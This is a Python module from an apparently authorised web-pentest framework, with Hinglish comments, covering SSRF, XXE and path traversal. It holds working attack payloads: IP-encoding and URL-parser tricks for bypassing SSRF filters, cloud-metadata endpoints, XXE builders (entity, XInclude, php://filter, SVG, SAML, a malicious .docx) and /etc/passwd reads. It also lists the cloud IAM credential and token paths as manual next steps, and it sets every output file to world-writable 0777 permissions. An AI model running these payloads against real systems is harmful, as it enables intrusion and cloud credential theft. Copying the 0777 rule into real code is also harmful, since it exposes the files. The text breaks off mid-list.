#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
WASP Module: mod_ssrf.py  |  Phase 15 - SSRF / XXE / Traversal
           (URL-fetch abuse / Cloud-metadata / internal smoke / XML external entity / file read)
=======================================================================================
v15.0.0 ULTRA ULTRA PRO MAX. Authorized security testing ONLY. Scope firewall +
rate limiter + request budget + evidence + checkpoint sab wasp_core se inherit
hote hain, isliye har request scope-check, rate-limit aur budget ke andar hi
jaati hai.

KYA KARTA HAI
  P14 browser ki cross-origin trust boundary dekh raha tha. P15 SERVER ko poochta
  hai: "MERA server, ATTACKER-CHUNA hua URL kahan tak fetch kar leta hai?" ->
  yani server-side request forgery ki poori family + XML parsers ki trust:
    * SSRF        - URL-fetch features se internal/metadata/file resources
    * Cloud IMDS  - 169.254.169.254 family (AWS/GCP/Azure/DO/ECS/Alibaba/OpenStack)
    * Internal    - loopback port smoke (read-only, RoE-gated)
    * XXE         - external entity / param-entity / XInclude / SVG / docx / SAML
    * Traversal   - path encoding matrix se file read (dot-dot-slash ki poori family)
  FUNDAMENTAL DISCIPLINE (P12/P13/P14 handoff): blind scanner NAHI. P12 redirect/
  xxe-ready targets, P13 header_url_hints, P14 oauth_redirect_uris, P9 SAML
  surface, P5 import/upload artifacts, P7 js params, P2 forms, P3 sensitive
  params, P8 priority queue = seed list. Wahan targeted, evidence-backed probes.

STAGES (A-K)
  A  SSRF/XXE/Traversal surface ..... P12 feedforward (redirect_targets/xxe_ready)
                                     + P12 redirect_scan/injection_matrix/
                                     reflection_map + P13 feedforward (header_url_
                                     hints) + P14 feedforward (oauth_redirect_uris)
                                     + P14 oauth_state_audit + P9 saml_surface/
                                     auth_redirect + P5 content artifacts (import/
                                     upload/pdf/webhook) + P7 js endpoints/params +
                                     P2 forms (URL-fields) + P3 sensitive_params +
                                     P8 priority queue + P6 stack (OS hint) +
                                     cold-start URL-param harvest -> ranked targets
  B  Baseline & calibration ......... per-endpoint 2x GET baseline + soft-404 +
                                     WAF signature map (P12 waf + fresh) -> verdict
                                     calibration
  C  SSRF fetch engine .............. self-fetch FULL-READ proof (homepage sha1
                                     match) + canary differential + blind
                                     differential (status/len/timing z-score:
                                     self vs NXDOMAIN vs loopback) + scheme probe
                                     (file:// via fetcher) + header-host injection
                                     (X-Forwarded-Host/X-Original-URL/X-Rewrite-URL)
  D  Bypass + Cloud metadata ........ 16 IP-encoding variants (decimal/hex/octal/
                                     zero-pad/IPv6-mapped/enclosed-alnum/fullwidth/
                                     trailing-dot/...) + 10 URL-parser confusion
                                     (userinfo/fragment/triple-slash/backslash) +
                                     redirect-chain internal bounce + CROWN JEWEL:
                                     cloud metadata reachability (SAFE-PATHS ONLY,
                                     kabhi bhi credentials path nahi) 7 providers
  E  Internal smoke (RoE gate) ..... ssrf_internal_smoke default OFF; ON par sirf
                                     target-host + loopback x 5 benign ports, 1
                                     GET each, banner-only (body kabhi store nahi)
  F  XXE engine ..................... classic external entity (file:// in-band +
                                     error-based) + param-entity blind + internal
                                     DTD fetch + XInclude + php://filter double-
                                     decode (content never stored) + SVG + docx
                                     import + SAML + xmlrpc system.listMethods +
                                     parser-differential (hardened parser detect).
                                     POST-based probes = RoE gate ssrf_allow_post
                                     (default OFF); GET-param XML probes hamesha
  G  Traversal ULTRA matrix ......... 30 encoding variants (raw/URL/double/overlong
                                     UTF-8/fullwidth/Tomcat-semicolon/Spring/null-
                                     byte-legacy/backslash/absolute) x non-secret
                                     file targets (/etc/hostname, /etc/passwd,
                                     boot.ini, win.ini) - content REDACTED (sirf
                                     sha1+len+marker boolean store hota hai)
  H  Differential stats ............. median/MAD/robust-z timing engine, 3-sample
                                     repeats, false-positive guard (soft-404 +
                                     baseline consistency)
  I  Technique matrix ............... 40+ rows: classic/blind/semi-blind, IP
                                     encodings, parser confusions, IMDSv1/v2,
                                     gopher/dict (MANUAL-ONLY hypotheses), PDF-gen,
                                     webhook, XML-RPC pingback, DNS-rebinding
                                     (manual), XXE families, traversal families
  J  Chains & hypotheses ............ 8+ kill-chains (SSRF->IMDS->cloud-admin,
                                     XXE->config->DB, traversal->secrets->session
                                     forgery, SVG->XXE->SSRF->metadata, PDF->file://
                                     ->LFI, SAML->XXE->auth-bypass...) + 9 manual
                                     wave hypotheses
  K  Reports ....................... 26+ output files: ssrf_surface.json,
                                     ssrf_matrix.json, metadata_cloud.json,
                                     internal_smoke.json, bypass_matrix.json,
                                     xxe_matrix.json, traversal_matrix.json,
                                     xxe_payloads/*.xml (INERT), SSRF_FINDINGS.md,
                                     XXE_FINDINGS.md, ssrf_test_plan.md,
                                     TECHNIQUES_CATALOG_SSRF.md, cwe_owasp_map_ssrf
                                     .json + feedforward (P16/P17/P20/P23/P24/P26/
                                     P28/P32) + MANIFEST

VERDICT ENGINE (P12/P13/P14-compatible multi-signal)
  CONFIRMED   -> deterministic proof (homepage sha1 via fetcher, metadata markers,
                 file-content marker, error-echo of our SYSTEM path)
  SUSPECTED   -> partial/single signal (status-differential blind, DTD-fetch error)
  HARDENED    -> defense present (parser rejects DTD, fetcher allow-listed)
  BLOCKED     -> WAF/probe-level block (fingerprint input, finding nahi)
  NOISE       -> baseline unstable / soft-404 template - verdict nahi

SAFETY MODEL (P15 ke liye sabse strict - ye phase sabse zyada 'double-edged' hai)
  * ZERO EXTERNAL EGRESS: har probe URL target-host, loopback, ya reserved
    (.invalid / RFC5737) space me hota hai. Koi attacker-controlled external
    host/DNS service (nip.io/interact.sh/burpcollab) KABHI use nahi hota -
    blind detection in-band + differential se hi hoti hai.
  * CLOUD METADATA: sirf NON-SECRET paths (/latest/meta-data/ listing jaisi).
    FORBIDDEN_PATH_PATTERNS (credentials/security-credentials/token/secret)
    probe-builder me hard-enforced hain + self-test me assert hote hain.
    IAM keys / tokens kabhi fetch/store NAHI hote - wo MANUAL wave hai.
  * FILE READ DISCIPLINE: file/traversal/xxe-read responses ka content kabhi
    store nahi hota - sirf len + sha1-prefix + marker-boolean. Evidence me
    "[WASP P15 REDACTED]" placeholder jaata hai. PII/creds regex double-guard.
  * INTERNAL SMOKE: default OFF; ON par bhi sirf target-host + loopback, 5
    benign ports, 1 GET each, banner-only. RFC1918 scan / port-sweep KABHI nahi.
  * NO DoS: entity expansion sirf 2-level harmless (billion laughs FORBIDDEN),
    timing probes 3-sample bounded, traversal truncation 2 tries.
  * POST-based XXE/import probes RoE-gated (ssrf_allow_post default OFF) -
    GET-param XML probes (non-mutating) hamesha allowed.
  * allow_active=False -> PASSIVE mode: seed census + offline hypotheses only.
  * Har stage checkpointed (Ctrl+C safe), sab caps config se tunable.
  * Sab result files RWX (0777) - RWX standing rule wrappers se guaranteed.
"""

import os
import re
import sys
import json
import time
import copy
import base64
import zipfile
import hashlib
import urllib.parse

# --- WASP v2.2 standalone path fix (auto-inserted) ---
_wasp22_dir = os.path.dirname(os.path.abspath(__file__))
if _wasp22_dir not in sys.path:
    sys.path.insert(0, _wasp22_dir)
_wasp22_p = _wasp22_dir
while _wasp22_p != os.path.dirname(_wasp22_p):
    _wasp22_p = os.path.dirname(_wasp22_p)
    if os.path.exists(os.path.join(_wasp22_p, "wasp_core.py")):
        if _wasp22_p not in sys.path:
            sys.path.insert(0, _wasp22_p)
        break
# --- end WASP v2.2 fix ---

try:
    from wasp_core import (Cfg, Scope, ScopeError, Evidence, HttpClient, Checkpoint,
                           outdir_for, now_iso, save_json, save_text, load_json,
                           rand_str, shannon_entropy, host_of, median, mad,
                           robust_z, truncate, similarity, module_ctx,
                           write_feedforward, write_manifest, soft404_baseline,
                           is_soft404, title_of, waf_signature, dns_resolve,
                           redirect_chain, interrupted, info, ok, warn, err,
                           head, C, VERSION, now_human, human_size)
    CORE = True
except ImportError:
    CORE = False
    print("[-] wasp_core.py isi folder me hona chahiye (wasp_core.py not found).")
    print("    Ye module WASP framework ka hissa hai: python3 wasp.py run --module 15")
    sys.exit(1)

NAME = "ssrf"
PHASE = "15-ssrf"
PLAN_VERSION = "15.0.0"

# ===========================================================================
# TUNABLES (config.json attributes override kar sakte hain)
# ===========================================================================
DEFAULTS = {
    "ssrf_url_params": 40,          # param-candidate endpoint cap (discovery)
    "ssrf_fetch_endpoints": 12,     # active fetch-probe endpoint cap
    "ssrf_ip_variants": 16,         # IP-encoding bypass variants cap
    "ssrf_parse_tricks": 10,        # URL-parser confusion variants cap
    "ssrf_timing_samples": 3,       # blind differential repeats (timing)
    "ssrf_metadata_probe": True,    # cloud metadata reachability (SAFE paths only)
    "metadata_base": "http://169.254.169.254",  # IMDS base (test/mock ke liye override)
    "ssrf_internal_smoke": False,   # RoE GATE: loopback/own-host port smoke
    "ssrf_smoke_ports": "80,443,8080,8000,8443",  # benign smoke ports (max 5)
    "ssrf_allow_post": False,       # RoE GATE: POST-based XXE/import probes
    "ssrf_xxe_targets": 10,         # XXE endpoint cap
    "ssrf_xxe_payloads": 8,         # payload families per target cap
    "ssrf_traverse_targets": 12,    # traversal endpoint cap
    "ssrf_traverse_probes": 24,     # per-target traversal probe budget
    "ssrf_scheme_probe": True,      # file:// scheme via fetcher (detection-only)
    "ssrf_header_probe": True,      # X-Forwarded-Host / X-Original-URL probes
    "ssrf_redirect_probe": True,    # redirect-chain internal bounce probe
    "ssrf_cold_start": 24,          # cold-start URL-param harvest GET cap
}

# ===========================================================================
# RWX STANDING RULE (user memory): pentest ke SAARE result/output files ko
# read+write+execute (0777 rwxrwxrwx) permission milni chahiye.
# ===========================================================================
def _rwx_result(path):
    try:
        os.chmod(path, 0o777)
    except OSError:
        pass
    return path


def _rwx_save_json(path, obj):
    d = os.path.dirname(path)
    if d:
        _rwx_dir(d)
    with open(path, "w") as f:
        json.dump(obj, f, indent=2, default=str)
    return _rwx_result(path)


def _rwx_save_text(path, text):
    d = os.path.dirname(path)
    if d:
        _rwx_dir(d)
    with open(path, "w") as f:
        f.write(text if isinstance(text, str) else str(text))
    return _rwx_result(path)


def _rwx_dir(path):
    try:
        os.makedirs(path, exist_ok=True)
        os.chmod(path, 0o777)
    except OSError:
        pass
    return path


# ===========================================================================
# SEVERITY CLASSIFICATION (P12/P13/P14 pattern - key -> sev/cvss/why)
# ===========================================================================
SEVERITY_HINTS = {
    # ---- SSRF core ----
    "ssrf_full_read":            ("critical", 9.8, "Fetcher poora response wapas "
        "de raha hai (homepage sha1 match) - attacker internal services, cloud "
        "metadata aur file:// sab padh sakta hai (full-read SSRF)."),
    "ssrf_self_fetch":           ("high", 8.2, "Fetcher server-side se khud hi "
        "request karta hai (canary differential) - blind SSRF primitive confirm, "
        "internal smoke aur metadata ka gateway."),
    "ssrf_blind_differential":   ("high", 7.4, "Status/len/timing differential "
        "resolve vs NXDOMAIN - blind SSRF (response nahi dikhta par fetch hota "
        "hai; OOB ke saath exfil chain possible)."),
    "ssrf_scheme_file":          ("critical", 9.1, "Fetcher file:// scheme accept "
        "karta hai - local file read sirf URL se (LFI without upload)."),
    "ssrf_metadata_reachable":   ("critical", 9.4, "Cloud metadata service fetcher "
        "se reachable hai (IMDS) - instance identity readable; IAM credential "
        "path MANUAL wave (kabhi auto nahi). Chain -> P24 cloud takeover."),
    "ssrf_metadata_imdsv2":      ("medium", 6.0, "Metadata IMDSv2 (token required) "
        "hardening detect hui - SSRF plain-GET se block, header-injection chain "
        "ab bhi possible (manual verify karo)."),
    "ssrf_internal_reachable":   ("medium", 6.2, "Internal service fetcher se "
        "reachable hai (loopback smoke) - internal admin/debug panels ka "
        "pre-req (read-only smoke, no enumeration)."),
    "ssrf_redirect_internal":    ("medium", 5.8, "Redirect-chain se fetcher ko "
        "internal resource par bounce kiya ja sakta hai (anti-SSRF filter "
        "first-URL-only validate karta hai)."),
    "ssrf_ip_bypass":            ("medium", 6.4, "IP-encoding variant fetcher ke "
        "SSRF filter ko bypass karta hai (decimal/hex/octal/IPv6 form) - "
        "allow-list logic string-based hai."),
    "ssrf_parse_confusion":      ("medium", 5.9, "URL-parser confusion variant "
        "(userinfo/fragment/triple-slash) fetcher ke host-validation se bach "
        "nikalta hai - different-parser-bug family."),
    "ssrf_header_host_inject":   ("medium", 5.6, "X-Forwarded-Host/Original-URL "
        "response me reflect/behavior change - host-header SSRF + cache-poison "
        "chain (P26 handoff)."),
    "ssrf_webhook_novalidate":   ("high", 7.5, "Webhook/callback URL bina "
        "validation server-side se fire hota hai - blind SSRF + internal "
        "pingback primitive."),
    "ssrf_pdf_generator":        ("high", 7.8, "HTML->PDF/render endpoint external "
        "resources fetch karta hai (hypothesis) - classic PDF-SSRF (img/link "
        "tags se internal + metadata)."),
    "ssrf_dns_rebinding_manual": ("info", 0.0, "DNS-rebinding TOCTOU hypothesis "
        "(attacker DNS chahiye) - MANUAL wave item, kabhi auto nahi."),
    "ssrf_gopher_manual":        ("info", 0.0, "Gopher/dict/legacy scheme surface "
        "(hypothesis) - MANUAL-ONLY: Ye schemes destructive misuse (redis/"
        "smtp) me convert ho sakti hain, isliye kabhi probe nahi hoti."),
    # ---- XXE ----
    "xxe_file_read":             ("critical", 9.4, "XML parser external entity "
        "resolve karke file content echo/leak karta hai - /etc/passwd-class "
        "reads, config se creds tak (content REDACTED store hua hai)."),
    "xxe_error_based":           ("high", 7.9, "Parser error message me hamari "
        "entity/path echo hoti hai - blind XXE confirm (file content error me "
        "wrap ho sakta hai, manual follow-up)."),
    "xxe_param_entity_blind":    ("high", 7.4, "Parameter-entity DTD fetch attempt "
        "process hui - blind XXE (OOB ke saath full exfil chain manual me)."),
    "xxe_dtd_internal_fetch":    ("high", 7.0, "Internal DTD fetch differential - "
        "parser arbitrary URL/DTD se laata hai (XXE->SSRF chain)."),
    "xxe_xinclude":              ("high", 7.6, "XInclude supported (parse=text "
        "file href) - XML-fragment endpoints se file read."),
    "xxe_php_filter":            ("high", 8.0, "php://filter wrapper resolve hota "
        "hai - PHP app par arbitrary file read (double-decode se content kabhi "
        "store nahi hota)."),
    "xxe_svg_doc":               ("high", 7.2, "SVG parser entities resolve karta "
        "hai - upload->XXE->SSRF chain (P16 handoff)."),
    "xxe_office_import":         ("high", 7.3, "docx import parser external entity "
        "process karta hai - office-import XXE (payload INERT zip)."),
    "xxe_saml":                  ("critical", 9.0, "SAML assertion parser external "
        "entity resolve karta hai - auth-critical parser par file read (P9 "
        "chain: assertion tampering tak)."),
    "xxe_xmlrpc_pingback":       ("medium", 6.0, "XML-RPC endpoint live hai "
        "(system.listMethods) - pingback/pingback-SSRF surface (write-methods "
        "MANUAL-ONLY)."),
    "xxe_parser_hardened":       ("info", 0.0, "Parser DOCTYPE/external entities "
        "reject karta hai - hardening present (positive signal)."),
    # ---- Traversal ----
    "traversal_file_read":       ("critical", 9.3, "Path normalization missing - "
        "encoded dot-dot se file content mila (marker match, content REDACTED) - "
        "config/creds read tak chain."),
    "traversal_encoding_bypass": ("high", 7.7, "Encoding variant (double/overlong/"
        "fullwidth/Tomcat-semicolon) filter bypass karti hai - WAF block sirf "
        "raw ../ ko jaanta hai."),
    "traversal_absolute_path":   ("high", 7.9, "Absolute path injection accepted - "
        "path-join bug (document_root + attacker-path)."),
    "traversal_null_byte_legacy": ("medium", 5.5, "Null-byte truncation accepted "
        "(legacy runtime) - extension-whitelist bypass family."),
    "traversal_hardened":        ("info", 0.0, "Traversal variants normalize/block "
        "hote hain - hardening present (positive signal)."),
    # ---- surface ----
    "ssrf_surface_sparse":       ("info", 0.0, "Seed artifacts kam mile - P2/P5/P7/"
        "P12 pehle chalao (URL-fetch/import features wahan se aate hain)."),
    "ssrf_post_gate_skipped":    ("info", 0.0, "POST-based XXE probes RoE gate OFF "
        "the - hypothesis-only verdicts (ssrf_allow_post=true RoE check karke)."),
}
SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def classify_severity(key):
    sev, cvss, why = SEVERITY_HINTS.get(key, ("info", 0.0, "SSRF/XXE surface signal."))
    return sev, cvss, why


# ---------------------------------------------------------------------------
# PII + FILE-CONTENT REDACT (framework rule - P15 me file-content bhi add)
# ---------------------------------------------------------------------------
_PII_JWT = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}")
_PII_EMAIL = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
_PII_PHONE = re.compile(r"\+?\d[\d\s().-]{7,}\d")
# credential-shaped secrets (AKIA..., BEGIN PRIVATE KEY, aws_secret=, password=...)
_PII_CREDS = re.compile(
    r"(?i)((AKIA|ASIA)[0-9A-Z]{16}|BEGIN [A-Z ]*PRIVATE KEY|"
    r"(aws_secret_access_key|secret_access_key|api_key|apikey|passwd|password|"
    r"secret|token)\s*[:=]\s*[^\s,;\"]{6,})")


def pii_redact(s, limit=420):
    """PII + creds + private-key patterns -> masked (file content kabhi plain nahi)."""
    s = _PII_JWT.sub("eyJ***REDACTED***", s or "")
    s = _PII_EMAIL.sub(lambda m: m.group(0)[:2] + "***@***", s)
    s = _PII_PHONE.sub("***PHONE***", s)
    s = _PII_CREDS.sub(lambda m: (m.group(0)[:6] + "***REDACTED***"), s)
    return truncate(s, limit)


class Findings:
    def __init__(self):
        self.items = []

    def add(self, key, title, endpoint, detail, evidence_ref="", extra=None):
        sev, cvss, why = classify_severity(key)
        rec = {"id": "SSR-%03d" % (len(self.items) + 1), "key": key, "title": title,
               "severity": sev, "cvss_hint": cvss, "endpoint": endpoint,
               "detail": pii_redact(detail), "why_it_matters": why,
               "evidence": evidence_ref, "ts": now_iso()}
        if extra:
            rec.update(extra)
        self.items.append(rec)
        return rec


def _sev_counts(F):
    counts = {}
    for f in F.items:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    return counts


# ---------------------------------------------------------------------------
# CANARY SYSTEM (P12/P13/P14 pattern): har probe unique canary, markers se
# verdict proof. Family "waspP15" - report/manual-wave me grep-able.
# ---------------------------------------------------------------------------
def _canary(tag="c"):
    return "waspP15%s%s" % (tag, rand_str(8).upper())


REDACTED_PLACEHOLDER = "[WASP P15 REDACTED - file content stored nahi hota " \
                       "(detection-only); sirf len/sha1/marker-boolean save]"


def filesig(body):
    """File-content response ka REDACTED signature: len + sha1-prefix + flag."""
    b = body if isinstance(body, bytes) else (body or "").encode("utf-8", "ignore")
    return {"len": len(b), "sha1_12": hashlib.sha1(b).hexdigest()[:12],
            "content_stored": False}


# ===========================================================================
# PAYLOAD LIBRARY 1: IP-ENCODING VARIANTS (SSRF filter bypass matrix)
# ===========================================================================
# Har variant (label, host_string). Fetcher ka URL-parser jo bhi accept kare,
# differential se detect hota hai. Sab targets loopback/metadata = SAFE domain.

def _ip_int(ip):
    parts = ip.split(".")
    if len(parts) != 4:
        return None
    try:
        return sum(int(p) << (8 * (3 - i)) for i, p in enumerate(parts))
    except ValueError:
        return None


def ip_variants(ip, cap=16):
    """Ek IPv4 ke 16 SSRF-bypass encodings (decimal/hex/octal/IPv6/unicode...).
    cap tunable: ssrf_ip_variants."""
    v = []
    n = _ip_int(ip)
    if n is None:
        return v[:cap]
    a, b, c, d = (int(x) for x in ip.split("."))
    v.append(("dotted", ip))
    v.append(("decimal", str(n)))
    v.append(("hex32", "0x%08x" % n))
    v.append(("hex-nibbles", ".".join("0x%x" % p for p in (a, b, c, d))))
    v.append(("octal32", "0%o" % n))
    v.append(("octal-parts", ".".join("0%o" % p for p in (a, b, c, d))))
    v.append(("zero-pad", ".".join("%03d" % p for p in (a, b, c, d))))
    v.append(("fewer-octets", "%d.%d" % (a, (b << 16) | (c << 8) | d)))
    v.append(("three-octets", "%d.%d.%d" % (a, b, (c << 8) | d)))
    v.append(("hex-decimal-mix", "%d.0x%x.%d.%d" % (a, b, c, d)))
    v.append(("ipv6-mapped", "[::ffff:%d.%d.%d.%d]" % (a, b, c, d)))
    v.append(("ipv6-hex-mapped", "[::ffff:%02x%02x:%02x%02x]" % (a, b, c, d)))
    v.append(("ipv6-unspaced", "[0:0:0:0:0:ffff:%d.%d.%d.%d]" % (a, b, c, d)))
    def _enc(s):
        return "".join("⓪" if ch == "0" else chr(0x2460 + int(ch) - 1)
                       for ch in str(s))
    v.append(("enclosed-alnum", ".".join(_enc(p) for p in (a, b, c, d))))
    v.append(("fullwidth-dot", "。".join(str(p) for p in (a, b, c, d))))
    v.append(("trailing-dot", ip + "."))
    # overlong/odd extras jab cap bada ho
    v.append(("dotless-octal", "0%o" % a + "." + "0%o" % ((b << 16) | (c << 8) | d)))
    v.append(("null-host-ish", "0.0.0.0" if ip == "127.0.0.1" else ip))
    return v[:max(1, cap)]


# ===========================================================================
# PAYLOAD LIBRARY 2: URL-PARSER CONFUSION (host-validation bypass)
# ===========================================================================
# Har trick (label, url_template % (bad_host, port, path)).
# bad_host hamesha loopback/own-host hota hai - ZERO external egress.

def parse_tricks(bad_host, port, path, cap=10):
    """10 classic URL-parser confusion templates (different-parser-bug family)."""
    t = [
        ("userinfo-at",        "http://{h}@{bad}:{p}{pa}"),   # target ko userinfo me chhupao
        ("userinfo-empty",     "http://:@{bad}:{p}{pa}"),
        ("fragment-attacker",  "http://{bad}:{p}{pa}#@{h}/"),
        ("query-attacker",     "http://{bad}:{p}{pa}?@{h}/"),
        ("triple-slash",       "http:///{bad}:{p}{pa}"),
        ("backslash-scheme",   "http:/\\{bad}:{p}{pa}"),
        ("double-slash-scheme","http:////{bad}:{p}{pa}"),
        ("userinfo-percent",   "http://{h}%2F@{bad}:{p}{pa}"),
        ("semicolon-authority","http://;@{bad}:{p}{pa}"),
        ("plus-port",          "http://{bad}:{p}+{pa}"),
    ]
    out = []
    for label, tpl in t[:max(1, cap)]:
        out.append((label, tpl.format(h="trusted.example.com", bad=bad_host,
                                      p=port, pa=path)))
    return out


# ===========================================================================
# PAYLOAD LIBRARY 3: CLOUD METADATA PROVIDERS (SAFE-PATHS ONLY - CROWN JEWEL)
# ===========================================================================
# HARD RULE: FORBIDDEN_PATH_PATTERNS ke koi bhi path PROBE list me nahi ja
# sakta - _metadata_probes() builder me hard-enforced + self-test assert.
# IAM credentials / tokens / keys kabhi fetch NAHI hote (manual wave).
FORBIDDEN_PATH_PATTERNS = ("credential", "security-credential", "token",
                           "secret", "password", "api-key", "apikey",
                           "access-key", "private", "iam/security")

METADATA_PROVIDERS = [
    {"name": "AWS EC2 IMDSv1", "host": "169.254.169.254",
     "paths": ["/latest/meta-data/"],
     "headers": {},
     "markers": ["ami-id", "instance-id", "security-groups", "local-ipv4",
                 "reservation-id", "availability-zone"],
     "imds2_hint": ("401", "use IMDSv2")},
    {"name": "AWS EC2 IPv6", "host": "[fd00:ec2::254]",
     "paths": ["/latest/meta-data/"],
     "headers": {},
     "markers": ["ami-id", "instance-id", "availability-zone"],
     "imds2_hint": ("401", "use IMDSv2")},
    {"name": "GCP Metadata", "host": "metadata.google.internal",
     "paths": ["/computeMetadata/v1/"],
     "headers": {"Metadata-Flavor": "Google"},
     "markers": ["computeMetadata", "instance/", "project/"]},
    {"name": "GCP Link-Local", "host": "169.254.169.254",
     "paths": ["/computeMetadata/v1/"],
     "headers": {"Metadata-Flavor": "Google"},
     "markers": ["computeMetadata", "instance/"]},
    {"name": "Azure IMDS", "host": "169.254.169.254",
     "paths": ["/metadata/instance?api-version=2021-02-01"],
     "headers": {"Metadata": "true"},
     "markers": ["vmid", "compute", "subscriptionid"]},
    {"name": "DigitalOcean", "host": "169.254.169.254",
     "paths": ["/metadata/v1.json"],
     "headers": {},
     "markers": ["droplet_id", "region", "hostname"]},
    {"name": "Alibaba ECS", "host": "100.100.100.200",
     "paths": ["/latest/meta-data/"],
     "headers": {},
     "markers": ["instance-id", "region-id", "image-id"]},
    {"name": "ECS Task Metadata", "host": "169.254.170.2",
     "paths": ["/v2/metadata"],
     "headers": {},
     "markers": ["taskarn", "cluster", "family"]},
    {"name": "OpenStack", "host": "169.254.169.254",
     "paths": ["/openstack"],
     "headers": {},
     "markers": ["meta_data.json", "vendor_data.json"]},
]

# CROWN-JEWEL MANUAL-ONLY next steps (kabhi auto nahi) - report me likhe jaate hain
METADATA_MANUAL_WAVE = [
    "AWS: GET /latest/api/token (PUT) -> IMDSv2 token -> "
    "/latest/meta-data/iam/security-credentials/<role>  [MANUAL - creds kabhi "
    "auto-fetch/store nahi hote; RoE + cloud team ke saath]",
    "GCP: /computeMetadata/v1/instance/service-accounts/default/token "
    "[MANUAL-ONLY]",
    "Azure: /metadata/identity/oauth2/token [MANUAL-ONLY]",
    "Har provider ke identity-document paths manual verify karo (audit trail "
    "ke liye fetcher logs check karo).",
]


def _metadata_probes(conf):
    """(provider, url, headers) list - FORBIDDEN paths hard-filtered ke saath.
    metadata_base override (config/env) saare 169.254 hosts replace karta hai
    (mock/test determinism + air-gapped lab support)."""
    mb = (conf.get("metadata_base") or "http://169.254.169.254").rstrip("/")
    env_base = os.environ.get("WASP_P15_METADATA_BASE", "").strip()
    if env_base:
        mb = env_base.rstrip("/")
    probes = []
    for prov in METADATA_PROVIDERS:
        for p in prov["paths"]:
            low = p.lower()
            if any(f in low for f in FORBIDDEN_PATH_PATTERNS):
                continue                                    # hard rule
            host = prov["host"]
            if host in ("169.254.169.254", "100.100.100.200", "169.254.170.2"):
                url = mb + p
            else:
                url = "http://" + host + p
            probes.append({"provider": prov["name"], "url": url,
                           "headers": dict(prov["headers"]),
                           "markers": prov["markers"]})
    return probes


# ===========================================================================
# PAYLOAD LIBRARY 4: XXE PAYLOAD BUILDERS (detection-only, INERT outputs)
# ===========================================================================
XXE_CANARY_FILE = "/etc/hostname"          # non-secret 1-line file
XXE_MARKER_FILE = "/etc/passwd"            # marker-only boolean (root:x:)
PASSWD_MARKERS = ("root:x:", "root:*:", "root:!:", "bin:x:", "daemon:x:")
HOSTNAME_SHAPE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,60}\s*$")


def xxe_classic(sys_id, entity="waspxxe"):
    """Classic external entity - in-band read attempt (content kabhi store nahi)."""
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE wasp [<!ENTITY %s SYSTEM "%s">]>'
            '<wasp><probe>&%s;</probe></wasp>' % (entity, sys_id, entity))


def xxe_param_entity(dtd_url):
    """Parameter-entity blind probe - DTD fetch attempt (OOB-less differential)."""
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE wasp [<!ENTITY %% waspdtd SYSTEM "%s">%%waspdtd;]>'
            '<wasp><probe>1</probe></wasp>' % dtd_url)


def xxe_dtd_internal(url):
    """DOCTYPE SYSTEM internal fetch - parser arbitrary URL laata hai?"""
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE wasp SYSTEM "%s"><wasp><probe>1</probe></wasp>' % url)


def xxe_xinclude(target_file):
    """XInclude parse=text - XML-fragment endpoints par file read."""
    return ('<wasp xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include href="%s" parse="text"/></wasp>' % target_file)


def xxe_php_filter(target_file):
    """php://filter double-decode - base64-encode|decode roundtrip plaintext
    deti hai, isliye encoded content kabhi hamare paas aata hi nahi."""
    wrapper = ("php://filter/read=convert.base64-encode|convert.base64-decode"
               "/resource=%s" % target_file)
    return xxe_classic(wrapper, "waspflt")


def xxe_svg(target_file):
    """SVG document entity - upload/render parsers (P16 handoff)."""
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE svg [<!ENTITY %s SYSTEM "%s">]>'
            '<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4">'
            '<text x="0" y="4">&%s;</text></svg>'
            % ("waspsvg", target_file, "waspsvg"))


def xxe_saml(target_file):
    """SAML assertion entity - auth-critical parser (P9 chain)."""
    return ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE samlp [<!ENTITY %s SYSTEM "%s">]>'
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
            '<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:'
            '2.0:status:Success"/></samlp:Status>'
            '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            '&%s;</saml:Assertion></samlp:Response>'
            % ("waspsaml", target_file, "waspsaml"))


def xxe_docx_bytes(target_file):
    """Minimal .docx (zip) jiska [Content_Types].xml me external entity hai.
    Office-import XXE payload (POST gated). Bytes return karta hai."""
    content_types = ('<?xml version="1.0" encoding="UTF-8"?>'
                     '<!DOCTYPE Types [<!ENTITY %s SYSTEM "%s">]>'
                     '<Types xmlns="http://schemas.openxmlformats.org/package/'
                     '2006/content-types"><Default Extension="rels" ContentType='
                     '"application/vnd.openxmlformats-package.relationships+xml"/>'
                     '<Default Extension="xml" ContentType="application/xml"/>'
                     '<Override PartName="/word/document.xml" ContentType='
                     '"application/vnd.openxmlformats-officedocument.'
                     'wordprocessingml.document.main+xml"/>&%s;</Types>'
                     % ("waspdocx", target_file, "waspdocx"))
    document = ('<?xml version="1.0"?>'
                '<w:document xmlns:w="http://schemas.openxmlformats.org/'
                'wordprocessingml/2006/main"><w:body><w:p/></w:body></w:document>')
    rels = ('<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
            '2006/relationships"/>')
    buf = io_bytes()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("word/document.xml", document)
        z.writestr("_rels/.rels", rels)
    return buf.getvalue()


def io_bytes():
    import io
    return io.BytesIO()


def xxe_xmlrpc_list():
    """XML-RPC read-only method enumeration (write-methods MANUAL-ONLY)."""
    return ('<?xml version="1.0"?><methodCall><methodName>system.listMethods'
            '</methodName><params></params></methodCall>')


XMLRPC_LIVE_MARKERS = ("<methodResponse", "system.listMethods", "<array>",
